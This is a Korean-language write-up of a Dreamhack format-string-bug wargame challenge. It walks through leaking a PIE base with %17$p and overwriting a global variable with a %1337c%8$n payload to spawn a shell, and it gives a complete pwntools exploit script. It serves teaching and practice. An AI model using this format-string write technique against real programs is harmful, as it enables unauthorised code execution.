dreamhack format string bug
==================


**목표: changeme의 값을 1337로 바꾸기**


```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void get_string(char *buf, size_t size) {
  ssize_t i = read(0, buf, size);
  if (i == -1) {
    perror("read");
    exit(1);
  }
  if (i < size) {
    if (i > 0 && buf[i - 1] == '\n') i--;
    buf[i] = 0;
  }
}

int changeme;

int main() {
  char buf[0x20];
  
  setbuf(stdout, NULL);
  
  while (1) {
    get_string(buf, 0x20);
    printf(buf);
    puts("");
    if (changeme == 1337) {
      system("/bin/sh");
    }
  }
}
```

## 분석

### 보호 기법

<img width="1040" height="127" alt="image" src="https://github.com/user-attachments/assets/4fd765d8-52ea-45a4-865a-eacae34790f0" />

pie,nx 등의 보호 기법이 적용되어 있다.   
카나리는 없지만 sfp나 리턴주소를 변조할 만한 bof 취약점이 보이지 않는다.


### 바이너리 분석

코드에서는 get_string 함수를 통해 buf에 32바이트 입력을 받고 있다.     
입력한 buf를 printf의 인자로 직접 사용하므로 포맷 스트링 버그 취약점이 발생한다.     
사용자의 입력을 포맷 스트링의 사용 -> 포맷 스트링 버그 발생, 이를 이용해 임의 주소 읽기 및 쓰기 가능   


## 익스플로잇 

### 설계

**1. changeme 주소 구하기**    
 
현재 바이너리에는 pie가 적용되어 있어 changeme의 주소는 실행 때마다 바뀐다.    
pie 베이스 주소를 먼저 구하고 그 주소를 기준으로 계산해야 한다.


**2. changeme를 1337로 설정**    

get_string으로 changeme의 주소를 스택에 저장하면 printf에서 %n으로 changeme의 값을 조작할 수 있다.    
1337바이트의 문자열을 미리 출력하고 changeme에 값을 쓰면 changeme를 1337로 설정할 수 있다. 


### changeme 주소 구하기 

<img width="957" height="572" alt="image" src="https://github.com/user-attachments/assets/3596df95-434c-494c-bf83-5687c8976889" />

printf함수가 호출되는 오프셋을 찾고 브레이크포인트를 건다.    
프로그램이 실행되고 get_string에서 입력을 받을 때 값을 입력하면 printf를 호출하기 직전에 브레이크포인트가 걸린다.    

<img width="787" height="497" alt="image" src="https://github.com/user-attachments/assets/911f9108-3710-497d-b475-4914f3670957" />

이때 rsp을 출력해보면 rsp+0x58에 0x555555555293이 저장되어 있다.


<img width="1067" height="282" alt="image" src="https://github.com/user-attachments/assets/58c9d331-796a-40be-af89-d52d720dc0df" />

vmmap으로 확인해보면 해당 값은 바이너리가 매핑된 영역에 포함되는 주소이므로 사용해서 pie 베이스 주소를 구할 수 있다.

<img width="616" height="56" alt="image" src="https://github.com/user-attachments/assets/74522efb-fc54-4188-ac7f-f874c9bd8de3" />

rsp+0x58에 저장되어 있는 주소와 pie 베이스 주소 간의 오프셋은 0x1293이다.


> printf 는 rdi에 포맷 스트링을, rsi, rdx, rcx, r8, r9 그리고 스택에 포맷 스트링의 인자를 전달한다. 예를 들어 printf("%d %d %d %d %d %d %d %d %d", 1, 2, 3, 4, 5, 6, 7, 8, 9);를 호출하면 1,2,3,4,5,6,7,8,9는 각각 rsi,rdx,rcx,r8,r9,[rsp],[rsp+0x8],[rsp+0x18]에 전달된다.


이 문제에서 [rsp+0x58]는 포맷 스트링의 17번째 인자이므로 %17$p로 읽을 수 있다.    

* %17$p를 입력해서 출력한 주소 값에서 0x1293을 빼면 pie 베이스 주소가 된다
* pie 베이스 주소에 changeme의 오프셋을 더하면 changeme의 주소를 구할 수 있다

<img width="861" height="62" alt="image" src="https://github.com/user-attachments/assets/564f91af-a73a-42f2-837f-58a7e1ad7a2d" />

changeme의 오프셋은 이렇게 확인 가능하다. 


이를 종합해서 스크립트를 작성해서 코드 영역이 매핑된 주소와 changeme 변수의 주소를 구한다.


```python
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = process('./fsb_overwrite')
elf = ELF('./fsb_overwrite')

# [1] Get Address of changeme
p.sendline(b'%17$p') # FSB
leaked = int(p.recvline()[:-1], 16)
code_base = leaked - 0x1293
changeme = code_base + elf.symbols['changeme']

slog('code_base', code_base)
slog('changeme', changeme)
```




### 1337 길이의 문자열 출력

%n은 현재까지 출력된 문자열의 길이를 인자에 저장한다. 따라서 changeme 변수에 1337을 쓰려면 1337바이트의 문자열을 먼저 출력해야 한다.    
바이너리에서는 입력받는 길이를 0x20으로 제한하고 있어서 문자열을 직접 입력할 수는 없다. 포맷 스트링의 **width 속성** 을 사용할 수 있다.    

### changeme 덮어쓰기

* %1337c (1337자 출력)
* %8 / $n (8번째 인자에 쓰기)
* AAAAAA /
* changeme(8번째 인자)

이렇게 포맷 스트링을 구성해서 changeme의 값을 1337로 쓸 수 있다.



## 익스플로잇 코드 

```python
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = process('./fsb_overwrite')
elf = ELF('./fsb_overwrite')

# [1] Get Address of changeme
p.sendline(b'%17$p') # FSB
leaked = int(p.recvline()[:-1], 16)
code_base = leaked - 0x1293
changeme = code_base + elf.symbols['changeme']

slog('code_base', code_base)
slog('changeme', changeme)

# [2] Overwrite changeme
payload = b'%1337c' # 1337을 min width로 하는 문자를 출력해 1337만큼 문자열이 사용되게 함
payload += b'%8$n' # 현재까지 사용된 문자열의 길이를 8번째 인자(p64(changeme)) 주소에 작성
payload += b'A'*6 # 8의 배수를 위한 패딩
payload = payload + p64(changeme) # 페이로드 16바이트 뒤에 changeme 변수의 주소를 작성

p.sendline(payload)

p.interactive()
```

* 원격으로 연결해서 해줄때는 b'%17$p를 15로 바꿔준다. (환경차이) 


<img width="678" height="363" alt="image" src="https://github.com/user-attachments/assets/e5adc678-735c-4908-a8a4-05004b8edafc" />


